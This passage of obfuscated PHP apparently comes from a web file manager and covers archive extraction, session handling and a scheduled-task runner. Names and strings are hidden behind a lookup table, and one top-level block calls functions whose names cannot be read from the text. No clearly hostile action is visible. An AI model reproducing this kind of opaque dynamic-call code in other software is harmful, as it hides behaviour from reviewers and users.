self::localFilePath($e÷•ààØ…Ú, $AŞ—Ôé¥¬Ğ); $AÇî éøğ = $dìÚš˜Ïìˆ ? $dìÚš˜Ïìˆ : parent::download($e÷•ààØ…Ú, $AÇî éøğ); } $AÇî éøğ = self::iconvSystem($AÇî éøğ); $EÁÚÚ Ò˜ò = isset($aÂÂŒˆŞÈÚ[$E¹Àî¥ğ—®[1044]]) ? $aÂÂŒˆŞÈÚ[$E¹Àî¥ğ—®[1044]] : $E¹Àî¥ğ—®[1045]; goto dÁÆÃÑµ¿­; fâ¾»ƒ¥ä: mk_dir($D«¡ëµÙ‘Ã); $AŞ—Ôé¥¬Ğ = self::fileExt($D…¡¦ñõ«š); $AÇî éøğ = $D«¡ëµÙ‘Ã . $E¹Àî¥ğ—®[104] . $AŞ—Ôé¥¬Ğ; goto e××õ¸†ŸĞ; Aéõ¯÷ÍÛ: Hook::trigger($E¹Àî¥ğ—®[1049], $D«¡ëµÙ‘Ã); recursion_dir($D«¡ëµÙ‘Ã, $fÅ¾Ù¿‡ÉÒ, $Fñçİ‚…Ï˜, 0); $BˆÔò¨Ú÷½ = array_merge($fÅ¾Ù¿‡ÉÒ, $Fñçİ‚…Ï˜); goto CœŸÔµ„óÕ; dÁÆÃÑµ¿­: $BË‡âÙ“™ã = KodArchive::extract($AÇî éøğ, $D«¡ëµÙ‘Ã . $E¹Àî¥ğ—®[8], $EÁÚÚ Ò˜ò); self::archiveExt(); if (!$BË‡âÙ“™ã[$E¹Àî¥ğ—®[1046]]) { show_json($E¹Àî¥ğ—®[1047] . $BË‡âÙ“™ã[$E¹Àî¥ğ—®[1048]], !1); } goto Aéõ¯÷ÍÛ; c—‚µÅ‰¸­: if (!($D…¡¦ñõ«š = parent::info($e÷•ààØ…Ú))) { show_json(LNG($E¹Àî¥ğ—®[1043]), !1); } if (!($EòÓ¸Òê· = parent::infoFull($fÈè‡Ó›¯Ÿ))) { $fÈè‡Ó›¯Ÿ = parent::mkdir($fÈè‡Ó›¯Ÿ); $EòÓ¸Òê· = array($E¹Àî¥ğ—®[85] => $fÈè‡Ó›¯Ÿ); } else { if (isset($EòÓ¸Òê·[$E¹Àî¥ğ—®[399]]) && trim($EòÓ¸Òê·[$E¹Àî¥ğ—®[85]], $E¹Àî¥ğ—®[8]) != trim($fÈè‡Ó›¯Ÿ, $E¹Àî¥ğ—®[8])) { $AŠÊÇª³–Í = KodIO::make($EòÓ¸Òê·[$E¹Àî¥ğ—®[481]]); $cº“šÔğÏè = parent::fileNameAuto($AŠÊÇª³–Í, $EòÓ¸Òê·[$E¹Àî¥ğ—®[28]], REPEAT_RENAME_FOLDER, !0); $fÈè‡Ó›¯Ÿ = parent::mkdir($AŠÊÇª³–Í . $cº“šÔğÏè); $EòÓ¸Òê· = array($E¹Àî¥ğ—®[85] => $fÈè‡Ó›¯Ÿ); } } $fÈè‡Ó›¯Ÿ = $EòÓ¸Òê·[$E¹Àî¥ğ—®[85]]; goto Eˆ¼‘éŠ¶; D‚¼±Ñì¬: $E¹Àî¥ğ—® =& $_SERVER[í¤âËÚ£¶íÊ¢]; $e÷•ààØ…Ú = $aÂÂŒˆŞÈÚ[$E¹Àî¥ğ—®[85]]; $fÈè‡Ó›¯Ÿ = $aÂÂŒˆŞÈÚ[$E¹Àî¥ğ—®[1042]]; goto c—‚µÅ‰¸­; Eˆ¼‘éŠ¶: $Bêİ§‘¬ØÅ = self::tmpFileName($D…¡¦ñõ«š); $D«¡ëµÙ‘Ã = TEMP_FILES . $Bêİ§‘¬ØÅ; del_dir($D«¡ëµÙ‘Ã); goto fâ¾»ƒ¥ä; CœŸÔµ„óÕ: foreach ($BˆÔò¨Ú÷½ as $AéáªÆ¡Ëì) { $AéáªÆ¡Ëì = self::iconvApp($AéáªÆ¡Ëì); self::move($AéáªÆ¡Ëì, $fÈè‡Ó›¯Ÿ, $aë¿ÚÕêä); } del_dir($D«¡ëµÙ‘Ã); if (!$dìÚš˜Ïìˆ) { del_file($AÇî éøğ); } goto A¤æ‰ÎÒÑ; A¤æ‰ÎÒÑ: return !0; goto bÉ¼–¾¾ÖÔ; bÉ¼–¾¾ÖÔ: } public static function unzipList($AØéµ²…±¦) { goto C· À¼ğÔ­; fìø¹ˆÚ’…: return $dùĞ¢ÌÆ¼ó[$eïñ¾õ“è÷[1048]]; goto F’Ã‰ƒÜ„²; FÄç°ç…“: if (isset($DÄœêÕ¡¬î)) { $CÂ‹ƒò¦ = array($DÄœêÕ¡¬î[$eïñ¾õ“è÷[85]], $DÄœêÕ¡¬î[$eïñ¾õ“è÷[1050]], $DÄœêÕ¡¬î[$eïñ¾õ“è÷[28]]); $b °ØôÒ¦ = md5(implode($eïñ¾õ“è÷[80], $CÂ‹ƒò¦)) . $eïñ¾õ“è÷[104] . get_path_ext($DÄœêÕ¡¬î[$eïñ¾õ“è÷[28]]); } else { $CÂ‹ƒò¦ = array($EÛ‘‡—ÃíÀ[$eïñ¾õ“è÷[28]], $EÛ‘‡—ÃíÀ[$eïñ¾õ“è÷[85]], $EÛ‘‡—ÃíÀ[$eïñ¾õ“è÷[87]]); $b °ØôÒ¦ = md5(implode($eïñ¾õ“è÷[80], $CÂ‹ƒò¦)) . $eïñ¾õ“è÷[104] . $aÓ¡¸£ŒÚË; } if ($C‰‘ã„Ê‹˜ == -1) { $aà¶óŸ¿ÂÍ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\x56\151\x65\167\57{$a˜¨ƒÛÇ‹‡}\57{$b °ØôÒ¦}\56\154\x6f\147"; $FŸ£È¦æÒ = self::infoFull($aà¶óŸ¿ÂÍ); if ($FŸ£È¦æÒ) { $aà¶óŸ¿ÂÍ = $FŸ£È¦æÒ[$eïñ¾õ“è÷[85]]; $f´‰Œ»ó = self::getContent($aà¶óŸ¿ÂÍ); if ($f´‰Œ»ó) { $bµÖŞÃŞö = json_decode($f´‰Œ»ó, !0); if (count($bµÖŞÃŞö) >= $a¤Ğéç†æô) { show_json(sprintf(LNG($eïñ¾õ“è÷[1052]), count($bµÖŞÃŞö)), !1); } return $bµÖŞÃŞö; } } else { $aà¶óŸ¿ÂÍ = self::mkfile($aà¶óŸ¿ÂÍ); } } $DàçïñªŒº = TEMP_FILES . $a˜¨ƒÛÇ‹‡; goto eÆØŸÕâÛÖ; eÆØŸÕâÛÖ: if (!is_dir($DàçïñªŒº)) { mk_dir($DàçïñªŒº); } $CÅÊ£ï¸ø‹ = $DàçïñªŒº . $eïñ¾õ“è÷[8] . $b °ØôÒ¦; if (!@file_exists(self::iconvSystem($CÅÊ£ï¸ø‹))) { if (isset($DÄœêÕ¡¬î)) { url_request($c˜Õ‡ù¶œÃ, $eïñ¾õ“è÷[1053], $CÅÊ£ï¸ø‹); } else { $ašÎ‰Ö•†Î = self::localFilePath($c˜Õ‡ù¶œÃ, $aÓ¡¸£ŒÚË); $CÅÊ£ï¸ø‹ = $ašÎ‰Ö•†Î ? $ašÎ‰Ö•†Î : self::download($c˜Õ‡ù¶œÃ, $CÅÊ£ï¸ø‹); } } goto a›ó×ˆæÓ™; b©àâÖ—Í¨: $a¤Ğéç†æô = 50000; if (request_url_safe($c˜Õ‡ù¶œÃ)) { $DÄœêÕ¡¬î = parse_url_query($c˜Õ‡ù¶œÃ); if (!isset($DÄœêÕ¡¬î[$eïñ¾õ“è÷[85]])) { show_json($eïñ¾õ“è÷[1051], !1); } } $CĞŸæ†â‡ö = isset($DÄœêÕ¡¬î) ? $DÄœêÕ¡¬î[$eïñ¾õ“è÷[85]] : $c˜Õ‡ù¶œÃ; goto fêêõŸ’‘ô; a›ó×ˆæÓ™: $CÅÊ£ï¸ø‹ = self::iconvSystem($CÅÊ£ï¸ø‹); if ($C‰‘ã„Ê‹˜ >= 0) { $B“²ƒñ¡ŠÌ = isset($AØéµ²…±¦[$eïñ¾õ“è÷[1054]]) ? $AØéµ²…±¦[$eïñ¾õ“è÷[1054]] : !1; $Cğ…×¢¶Ø = isset($AØéµ²…±¦[$eïñ¾õ“è÷[28]]) ? $AØéµ²…±¦[$eïñ¾õ“è÷[28]] : $eïñ¾õ“è÷[33]; KodArchive::filePreview($CÅÊ£ï¸ø‹, $C‰‘ã„Ê‹˜, $B“²ƒñ¡ŠÌ, $Cğ…×¢¶Ø); self::archiveExt(); die; } $dùĞ¢ÌÆ¼ó = KodArchive::listContent($CÅÊ£ï¸ø‹); goto cÀ˜õàéöá; C· À¼ğÔ­: $eïñ¾õ“è÷ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $c˜Õ‡ù¶œÃ = $AØéµ²…±¦[$eïñ¾õ“è÷[85]]; $C‰‘ã„Ê‹˜ = isset($AØéµ²…±¦[$eïñ¾õ“è÷[1050]]) ? $AØéµ²…±¦[$eïñ¾õ“è÷[1050]] : -1; goto b©àâÖ—Í¨; dÔ›Ÿ¨Ïğ: $bµÖŞÃŞö = json_encode($dùĞ¢ÌÆ¼ó[$eïñ¾õ“è÷[1048]]); self::setContent($aà¶óŸ¿ÂÍ, $bµÖŞÃŞö); if (count($dùĞ¢ÌÆ¼ó[$eïñ¾õ“è÷[1048]]) >= $a¤Ğéç†æô) { show_json(sprintf(LNG($eïñ¾õ“è÷[1052]), count($dùĞ¢ÌÆ¼ó[$eïñ¾õ“è÷[1048]])), !1); } goto fìø¹ˆÚ’…; cÀ˜õàéöá: self::archiveExt(); del_dir($DàçïñªŒº); if (!$dùĞ¢ÌÆ¼ó[$eïñ¾õ“è÷[1046]]) { show_json($dùĞ¢ÌÆ¼ó[$eïñ¾õ“è÷[1048]], !1); } goto dÔ›Ÿ¨Ïğ; fêêõŸ’‘ô: $EÛ‘‡—ÃíÀ = self::info($CĞŸæ†â‡ö); $aÓ¡¸£ŒÚË = self::fileExt($EÛ‘‡—ÃíÀ); $a˜¨ƒÛÇ‹‡ = self::tmpFileName($EÛ‘‡—ÃíÀ); goto FÄç°ç…“; F’Ã‰ƒÜ„²: } private static function fileExt($DŠ‚Øø—Ì) { $F•ßä±ïÅç =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bš¯í¾øğ = $DŠ‚Øø—Ì[$F•ßä±ïÅç[177]]; if ($bš¯í¾øğ == $F•ßä±ïÅç[1055]) { $c¡ˆİ„Øóè = $F•ßä±ïÅç[1056]; if (substr($DŠ‚Øø—Ì[$F•ßä±ïÅç[28]], -strlen($c¡ˆİ„Øóè)) == $c¡ˆİ„Øóè) { $bš¯í¾øğ = $F•ßä±ïÅç[1057]; } } self::archiveExt($bš¯í¾øğ); return $bš¯í¾øğ; } private static function zipFileList($dƒ‘‚Êèƒ–, $D£’±Š¤¿å = false) { $c«ìÃï±“ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $eÆ«Ø¡çë‹ = array(); foreach ($dƒ‘‚Êèƒ– as $e›¼ñ³Ã) { $Dæ£æ¶õ¢Ê = $e›¼ñ³Ã[$c«ìÃï±“[85]]; if ($D£’±Š¤¿å) { $Dæ£æ¶õ¢Ê = self::copy($e›¼ñ³Ã[$c«ìÃï±“[85]], $D£’±Š¤¿å, $c«ìÃï±“[753]); } else { $BÊ¬øõÚÏ’ = self::init($e›¼ñ³Ã[$c«ìÃï±“[85]]); if ($BÊ¬øõÚÏ’->getType() == $c«ìÃï±“[115]) { $Dæ£æ¶õ¢Ê = $BÊ¬øõÚÏ’->path; } } if ($Dæ£æ¶õ¢Ê && self::local()->exist($Dæ£æ¶õ¢Ê)) { $eÆ«Ø¡çë‹[$e›¼ñ³Ã[$c«ìÃï±“[85]]] = $Dæ£æ¶õ¢Ê; } } if (!empty($eÆ«Ø¡çë‹)) { return array_values($eÆ«Ø¡çë‹); } show_json(LNG($c«ìÃï±“[1021]), !1); } public static function tmpFileName($c¹‡çåŸô) { $CòĞ‡‚‡®È =& $_SERVER[í¤âËÚ£¶íÊ¢]; $BŠì˜‘öñ = array($c¹‡çåŸô[$CòĞ‡‚‡®È[28]], $c¹‡çåŸô[$CòĞ‡‚‡®È[85]], $c¹‡çåŸô[$CòĞ‡‚‡®È[87]], $c¹‡çåŸô[$CòĞ‡‚‡®È[490]]); return md5(implode($CòĞ‡‚‡®È[80], $BŠì˜‘öñ)); } private static function localFilePath($Aµ¿ìåôóç, $E‹©Ğ„ïŒÉ) { goto DáÅØ¥½¶Á; DáÅØ¥½¶Á: $eê˜—Ìã”„ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if ($E‹©Ğ„ïŒÉ == $eê˜—Ìã”„[1058] && strtoupper(substr(PHP_OS, 0, 3)) == $eê˜—Ìã”„[1059]) { return !1; } $e­ïÆ˜À¼ = KodIO::parse($Aµ¿ìåôóç); goto d°¡–¶µ±; d°¡–¶µ±: if ($e­ïÆ˜À¼[$eê˜—Ìã”„[29]] == KodIO::KOD_SOURCE) { $CÛ™×›¼Æë = Model($eê˜—Ìã”„[759])->fileInfoGet(KodIO::sourceID($Aµ¿ìåôóç)); if (!$CÛ™×›¼Æë[$eê˜—Ìã”„[85]]) { show_json($eê˜—Ìã”„[1060], !1); } $Aµ¿ìåôóç = $CÛ™×›¼Æë[$eê˜—Ìã”„[85]]; } $c¶‚áêÖ­Ñ = self::init($Aµ¿ìåôóç); $Dí‚Çã£ = $c¶‚áêÖ­Ñ->getType(); goto fèÈ‰ôÌçÉ; fèÈ‰ôÌçÉ: if ($Dí‚Çã£ == $eê˜—Ìã”„[115] || $Dí‚Çã£ == $eê˜—Ìã”„[1061]) { if (!$c¶‚áêÖ­Ñ->exist($c¶‚áêÖ­Ñ->path)) { show_json(LNG($eê˜—Ìã”„[114]), !1); } return $c¶‚áêÖ­Ñ->path; } return !1; goto dÂ—îŸè; dÂ—îŸè: } private static function archiveExt($cÜÙİˆŞ = '') { $GLOBALS[$_SERVER[í¤âËÚ£¶íÊ¢][1062]] = $cÜÙİˆŞ; } } goto e˜º³Ò…Õ; eÉÇ™°á„¥: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { goto D˜·Ûƒº‚; fÃÙ©êÄßÇ: $dÉİæÜ´Ò• = $GLOBALS[$FÀ´ç‡¶Èí[6]][$FÀ´ç‡¶Èí[354]]; self::$sessionTime = $dÉİæÜ´Ò•[$FÀ´ç‡¶Èí[1447]]; $C÷……©„ˆ¥ = isset($GLOBALS[$FÀ´ç‡¶Èí[1448]]) ? $GLOBALS[$FÀ´ç‡¶Èí[1448]] : SESSION_ID; goto CóùŒ¯Ìî³; D˜·Ûƒº‚: $FÀ´ç‡¶Èí =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $AÚÆçÖ„”Õ = false; if ($AÚÆçÖ„”Õ) { return $AÚÆçÖ„”Õ; } goto fÃÙ©êÄßÇ; CóùŒ¯Ìî³: if (self::$sessionSign) { } else { if (Cookie::get($C÷……©„ˆ¥)) { self::$sessionSign = Cookie::get($C÷……©„ˆ¥); } else { self::$sessionSign = guid(); } } Cookie::setSafe($C÷……©„ˆ¥, self::$sessionSign, self::$sessionTime); $FÅ£ä±İç = $dÉİæÜ´Ò•[$FÀ´ç‡¶Èí[1449]]; goto eŠ÷®¡ôÙ¾; c„‘Üˆ†Å: if (!self::$data) { CacheLock::lock(self::$sessionSign); self::$data = self::$handle->get(self::$sessionSign); CacheLock::unlock(self::$sessionSign); self::$data = unserialize(self::$data); if (!is_array(self::$data)) { self::$data = array(); } } $AÚÆçÖ„”Õ = new self(); return $AÚÆçÖ„”Õ; goto aÎòÈê„Ö; eŠ÷®¡ôÙ¾: $a‚Î®Ó©åá = $dÉİæÜ´Ò•[$FÅ£ä±İç]; $fóŠŠ“ªë = $dÉİæÜ´Ò•[$FÀ´ç‡¶Èí[762]]; switch ($FÅ£ä±İç) { case $FÀ´ç‡¶Èí[17]: self::$handle = Model($FÀ´ç‡¶Èí[763]); break; case $FÀ´ç‡¶Èí[764]: self::$handle = new CacheRedis($a‚Î®Ó©åá, $fóŠŠ“ªë); break; case $FÀ´ç‡¶Èí[765]: self::$handle = new CacheMemcached($a‚Î®Ó©åá, $fóŠŠ“ªë); break; case $FÀ´ç‡¶Èí[201]: $a‚Î®Ó©åá[$FÀ´ç‡¶Èí[85]] = $a‚Î®Ó©åá[$FÀ´ç‡¶Èí[85]] . $FÀ´ç‡¶Èí[1450]; self::$handle = new CacheFile($a‚Î®Ó©åá, $fóŠŠ“ªë); default: break; } goto c„‘Üˆ†Å; aÎòÈê„Ö: } public static function sign($bĞ·»•Ç = false) { $bĞ·»•Ç && (self::$sessionSign = $bĞ·»•Ç); self::init(); return self::$sessionSign; } public static function set($báÈª½ËŠœ, $f‘Ë¥›–Óå = false) { self::init(); if (is_array($báÈª½ËŠœ)) { foreach ($báÈª½ËŠœ as $eÅÛ§¼ø¢ => $DåŞ‡œÊÜÒ) { array_set_value(self::$data, $eÅÛ§¼ø¢, $DåŞ‡œÊÜÒ); } } else { array_set_value(self::$data, $báÈª½ËŠœ, $f‘Ë¥›–Óå); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($fäŠ§ïÎ¢ˆ = false) { self::init(); if (!$fäŠ§ïÎ¢ˆ) { return self::$data; } return array_get_value(self::$data, $fäŠ§ïÎ¢ˆ); } public static function remove($b×ğ¼µÖ‹†) { self::init(); unset(self::$data[$b×ğ¼µÖ‹†]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[í¤âËÚ£¶íÊ¢][767])) { self::$handle->clearTimeout(); } } } if ($_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][59]] != $_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][800]]) { goto c…§ê’¤¾¶; d«ÆŒº¶®¬: $d¾’‰áóÌ($_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][57]]); goto EÉÊÔë«ŒÄ; c…§ê’¤¾¶: $F†šÚ ˜¿Ï = $_SERVER[í¤âËÚ£¶íÊ¢][60]; $FÇ¹¸Åçôƒ = $_SERVER[$_SERVER[í¤âËÚ£¶íÊ¢][61]] . $_SERVER[í¤âËÚ£¶íÊ¢][62]; $föµ½¾îŒÏ = $F†šÚ ˜¿Ï($FÇ¹¸Åçôƒ); goto F’îÎõ«ŞÉ; F’îÎõ«ŞÉ: $eÃ·¿¨æÍ = explode($_SERVER[í¤âËÚ£¶íÊ¢][63], $föµ½¾îŒÏ); if (count($eÃ·¿¨æÍ) < $_SERVER[í¤âËÚ£¶íÊ¢][64]) { $DÁ‘×ïË = $_SERVER[í¤âËÚ£¶íÊ¢][65]; $DÁ‘×ïË(); } $d¾’‰áóÌ = $_SERVER[í¤âËÚ£¶íÊ¢][66]; goto d«ÆŒº¶®¬; EÉÊÔë«ŒÄ: } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { goto BáÏ•Œœ; E±Çò•ª: http_close(); self::valueSet($e ğõõ–°ˆ[1451], $e ğõõ–°ˆ[96]); Hook::bind($e ğõõ–°ˆ[1453], $e ğõõ–°ˆ[1454]); goto B„äÑõ‚¸Ä; B„äÑõ‚¸Ä: while (!0) { self::cacheClear(); if (self::valueGet($e ğõõ–°ˆ[694]) != $e ğõõ–°ˆ[96]) { self::valueSet($e ğõõ–°ˆ[1451], $e ğõõ–°ˆ[500]); self::log($e ğõõ–°ˆ[1455]); die; } self::valueSet($e ğõõ–°ˆ[1451], $e ğõõ–°ˆ[96]); self::valueSet($e ğõõ–°ˆ[1452], time()); self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } goto FÄÁÌî»¸; BáÏ•Œœ: $e ğõõ–°ˆ =& $_SERVER[í¤âËÚ£¶íÊ¢]; if (self::valueGet($e ğõõ–°ˆ[694]) != $e ğõõ–°ˆ[96]) { return; } if (self::valueGet($e ğõõ–°ˆ[1451]) == $e ğõõ–°ˆ[96]) { $c‘†‹ ƒ¬¡ = self::valueGet($e ğõõ–°ˆ[1452]); if (time() - $c‘†‹ ƒ¬¡ > self::AUTO_RESTART_TIME) { self::restart(); } return; } goto E±Çò•ª; FÄÁÌî»¸: } public static function restart() { $C›É‚º¾ =& $_SERVER[í¤âËÚ£¶íÊ¢]; http_close(); self::valueSet($C›É‚º¾[694], $C›É‚º¾[500]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet($C›É‚º¾[1451], $C›É‚º¾[500]); self::valueSet($C›É‚º¾[694], $C›É‚º¾[96]); } public static function shutdownEvent() { $fÅ”œÒÕñ½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; self::valueSet($fÅ”œÒÕñ½[1451], $fÅ”œÒÕñ½[500]); self::log($fÅ”œÒÕñ½[1456]); } public static function config($Eâ»¯ª¨”¥, $Aæ–ğ‰Šö) { self::valueSet($_SERVER[í¤âËÚ£¶íÊ¢][694], $Eâ»¯ª¨”¥); } private static function taskRunAll() { goto eÆµ³¤Õ÷¦; dÎ¼åĞª®ö: self::taskQueueRun($dêÏ ›¸È¼); self::closeDatabase(); goto BÏÚóï°· ; eÆµ³¤Õ÷¦: $e¯òÜòİœ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $dêÏ ›¸È¼ = timeFloat(); $bÄëØˆ”›Ô = Model($e¯òÜòİœ[1457])->listData(); goto B–‘ÃÛ¸; B–‘ÃÛ¸: $eŸÄê°•òÖ = count($bÄëØˆ”›Ô); for ($F¾¥¯¬àš = 0; $F¾¥¯¬àš < $eŸÄê°•òÖ; $F¾¥¯¬àš++) { $dÆ›ùî¤‹ = $bÄëØˆ”›Ô[$F¾¥¯¬àš]; if (!$dÆ›ùî¤‹[$e¯òÜòİœ[397]] || $dÆ›ùî¤‹[$e¯òÜòİœ[1458]] != $e¯òÜòİœ[96]) { continue; } if (!self::taskTimeCheck($dÆ›ùî¤‹)) { continue; } self::taskRun($dÆ›ùî¤‹); } Hook::trigger($e¯òÜòİœ[1459]); goto dÎ¼åĞª®ö; BÏÚóï°· : } private static function taskQueueRun($Bè±ßË˜) { $A‹Ü‡¬¤ÓŒ = 10; while (!0) { $DÆÔ÷ºÜ£ = TaskQueue::run(); if ($DÆÔ÷ºÜ£ === !1) { break; } if (timeFloat() - $Bè±ßË˜ >= $A‹Ü‡¬¤ÓŒ) { break; } } } private static function taskTimeCheck($AÕï‘ïœ†ª) { goto Eä‡ùòŠ‡; b°ˆĞˆõ£: switch ($cš‡µ²Ùá[$Bò…‹•›²[29]]) { case $Bò…‹•›²[1466]: if (time() - $d¯Á¶ÌÈ‹í < 3600 * 24 * 30) { return !1; } if ($cš‡µ²Ùá[$Bò…‹•›²[1466]] == date($Bò…‹•›²[1467]) && $bŠ†Àéâ±ô) { return !0; } break; case $Bò…‹•›²[1468]: if (time() - $d¯Á¶ÌÈ‹í < 3600 * 24 * 7) { return !1; } $f½õ¹ä‡°Ñ = date($Bò…‹•›²[1469]) == 0 ? 7 : date($Bò…‹•›²[1469]); if ($cš‡µ²Ùá[$Bò…‹•›²[1468]] == $f½õ¹ä‡°Ñ && $bŠ†Àéâ±ô) { return !0; } break; case $Bò…‹•›²[1461]: if (time() - $d¯Á¶ÌÈ‹í < 3600 * 24) { return !1; } if ($bŠ†Àéâ±ô) { return !0; } break; case $Bò…‹•›²[1470]: if (time() - $d¯Á¶ÌÈ‹í >= floatval($cš‡µ²Ùá[$Bò…‹•›²[1470]]) * 60) { return !0; } break; default: break; } return !1; goto cÔŞ‹—»ğà; Eä‡ùòŠ‡: $Bò…‹•›² =& $_SERVER[í¤âËÚ£¶íÊ¢]; $cš‡µ²Ùá = json_decode($AÕï‘ïœ†ª[$Bò…‹•›²[205]], !0); $d¯Á¶ÌÈ‹í = intval($AÕï‘ïœ†ª[$Bò…‹•›²[1452]]); goto E¥ù¨ÆˆÀ; E¥ù¨ÆˆÀ: $a¬»ôáè¹’ = strtotime($Bò…‹•›²[1460] . $cš‡µ²Ùá[$Bò…‹•›²[1461]] . $Bò…‹•›²[1462]) - strtotime($Bò…‹•›²[1463]); $F·—ĞĞ¿¦ = time() - strtotime(date($Bò…‹•›²[1464]) . $Bò…‹•›²[1465]); $bŠ†Àéâ±ô = $F·—ĞĞ¿¦ >= $a¬»ôáè¹’ && $F·—ĞĞ¿¦ <= $a¬»ôáè¹’ + 3600; goto b°ˆĞˆõ£; cÔŞ‹—»ğà: } private static function closeDatabase() { goto c·¤å·Ê‘Ì; c·¤å·Ê‘Ì: $bÊÔºš¹ØÖ =& $_SERVER[í¤âËÚ£¶íÊ¢]; static $E½Øä³¯î = 0; $AˆÇ¢ßÊ… = 1800; goto D½×ğçîõö; D½×ğçîõö: if (!$E½Øä³¯î) { $E½Øä³¯î = time(); } if (time() - $E½Øä³¯î < $AˆÇ¢ßÊ…) { return; } $E½Øä³¯î = time(); goto c…Ó£åã×; c…Ó£åã×: $F‡š¿’¢ä‚ = Model($bÊÔºš¹ØÖ[506])->db($bÊÔºš¹ØÖ[33]); if ($F‡š¿’¢ä‚) { $F‡š¿’¢ä‚->closeConnect(); } if (time() - TIME > 3600 * 24 * 7) { write_log($bÊÔºš¹ØÖ[1471], $bÊÔºš¹ØÖ[1472]); die; } goto Bñğ……„ìİ; Bñğ……„ìİ: } public static function taskRun($cµ†É¬£‡§) { goto CÍ»ÛÖ¡İš; CÍ»ÛÖ¡İš: $dó¨°¹¹¶ =& $_SERVER[í¤âËÚ£¶íÊ¢]; self::log($dó¨°¹¹¶[1473] . $cµ†É¬£‡§[$dó¨°¹¹¶[397]] . $dó¨°¹¹¶[1474] . $cµ†É¬£‡§[$dó¨°¹¹¶[28]] . $dó¨°¹¹¶[1475] . $cµ†É¬£‡§[$dó¨°¹¹¶[1476]]); Model($dó¨°¹¹¶[1457])->run($cµ†É¬£‡§[$dó¨°¹¹¶[397]]); goto c¶¯ŠíÂ¾À; c¶¯ŠíÂ¾À: $a‡ÅËß¦¹’ = timeFloat(); $cÇ„ºí¼Ğõ = $dó¨°¹¹¶[33]; switch ($cµ†É¬£‡§[$dó¨°¹¹¶[29]]) { case $dó¨°¹¹¶[312]: $e¡¬§ÌÃÜ² = url_request($cµ†É¬£‡§[$dó¨°¹¹¶[1476]], $dó¨°¹¹¶[236], !1, !1, !1, !1, 5); $cÇ„ºí¼Ğõ = strlen($e¡¬§ÌÃÜ²); break; case $dó¨°¹¹¶[235]: $cÇ„ºí¼Ğõ = Hook::apply($cµ†É¬£‡§[$dó¨°¹¹¶[1476]]); default: break; } goto DÒ´¦³¶Ï¶; DÒ´¦³¶Ï¶: Model($dó¨°¹¹¶[1477])->add(array($dó¨°¹¹¶[1478] => $dó¨°¹¹¶[33], $dó¨°¹¹¶[1479] => $dó¨°¹¹¶[500], $dó¨°¹¹¶[29] => $dó¨°¹¹¶[1480] . $cµ†É¬£‡§[$dó¨°¹¹¶[397]], $dó¨°¹¹¶[1481] => json_encode(array($dó¨°¹¹¶[28] => $cµ†É¬£‡§[$dó¨°¹¹¶[28]], $dó¨°¹¹¶[1482] => timeFloat() - $a‡ÅËß¦¹’, $dó¨°¹¹¶[298] => $cÇ„ºí¼Ğõ)))); self::log($dó¨°¹¹¶[1483] . $cµ†É¬£‡§[$dó¨°¹¹¶[397]] . $dó¨°¹¹¶[1484] . $cÇ„ºí¼Ğõ); return !0; goto f‘—£ñó™İ; f‘—£ñó™İ: } private static function valueGet($AØ×àÂ–ªÚ) { $d¨½ñç©½ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $fâÂØÁ = $d¨½ñç©½[1485]; $F èÍ¢Ü†ß = Model($d¨½ñç©½[1486])->get($AØ×àÂ–ªÚ, $fâÂØÁ); if (is_null($F èÍ¢Ü†ß)) { Model($d¨½ñç©½[1486])->set($d¨½ñç©½[694], $d¨½ñç©½[96], $fâÂØÁ); Model($d¨½ñç©½[1486])->set($d¨½ñç©½[1451], $d¨½ñç©½[500], $fâÂØÁ); $F èÍ¢Ü†ß = Model($d¨½ñç©½[1486])->get($AØ×àÂ–ªÚ, $fâÂØÁ); } return $F èÍ¢Ü†ß; } private static function valueSet($EÁ¿›º½¡î, $A÷ÍëŞ¾š”) { $B’İæã¡ì« =& $_SERVER[í¤âËÚ£¶íÊ¢]; return Model($B’İæã¡ì«[1486])->set($EÁ¿›º½¡î, $A÷ÍëŞ¾š”, $B’İæã¡ì«[1485]); } protected static function log($a¢àöçäÜ) { write_log($a¢àöçäÜ, $_SERVER[í¤âËÚ£¶íÊ¢][1472]); } private static function cacheClear() { $a„©´ë¸ŞÍ =& $_SERVER[í¤âËÚ£¶íÊ¢]; $bÒ‡¨æ¥ˆà = Model($a„©´ë¸ŞÍ[1486])->cacheKey($a„©´ë¸ŞÍ[1485]); Cache::clearMemory($bÒ‡¨æ¥ˆà); Model($a„©´ë¸ŞÍ[1457])->cacheClear(); } } goto c×¦‹Í¼; cµ«š±…ùÓ: if (!function_exists('_kodDe')) { function _kodDe($dà³ÀŞ­ÛŠ) { $dà³ÀŞ­ÛŠ = base64_decode($dà³ÀŞ­ÛŠ); $dƒ˜‡¨“‰® = strlen($dà³ÀŞ­ÛŠ); $b¬é¬¿åÁ¯ = ''; $eùƒ¥…îîŸ = ord($dà³ÀŞ­ÛŠ[0]) - 30; for ($f®Œãí¢ñ× = 1; $f®Œãí¢ñ× < $dƒ˜‡¨“‰®; $f®Œãí¢ñ× += 2) { if ($f®Œãí¢ñ× + 1 < $dƒ˜‡¨“‰®) { $b¬é¬¿åÁ¯ .= chr(ord($dà³ÀŞ­ÛŠ[$f®Œãí¢ñ× + 1]) + $eùƒ¥…îîŸ); $b¬é¬¿åÁ¯ .= 